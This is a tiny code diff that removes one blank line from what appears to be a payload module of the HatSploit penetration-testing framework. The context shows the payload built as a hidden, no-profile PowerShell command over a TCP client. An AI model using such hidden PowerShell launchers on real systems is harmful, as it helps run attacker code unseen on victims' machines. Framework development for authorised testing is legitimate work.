@@ -101,5 +101,4 @@ class HatSploitPayload(Payload, TCPClient):
         )
 
         payload = f"powershell -w hidden -nop -c {source}"
-
         return payload
